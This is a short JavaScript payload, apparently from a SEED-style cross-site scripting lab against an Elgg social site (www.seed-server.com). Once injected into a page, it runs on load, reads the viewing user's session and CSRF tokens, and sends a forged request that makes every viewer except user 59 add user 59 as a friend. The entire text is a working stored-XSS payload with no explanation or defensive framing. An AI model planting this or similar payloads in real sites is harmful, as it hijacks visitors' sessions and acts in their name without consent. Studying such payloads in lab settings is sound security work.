<script type="text/javascript">
  window.onload = function() {
    if (typeof elgg !== 'undefined'){
		if(elgg.security && elgg.security.token) {
			var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
			var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
			var loggedInUserId = elgg.session.user.guid; 
			
			if (loggedInUserId !== 59) {
				var sendurl = "http://www.seed-server.com/action/friends/add?friend=59" + ts + token;
				var Ajax = new XMLHttpRequest();
				Ajax.open("GET", sendurl, true);
				Ajax.setRequestHeader("Host", "www.seed-server.com");
				Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
				Ajax.send();
			}
    }
  }
}
</script>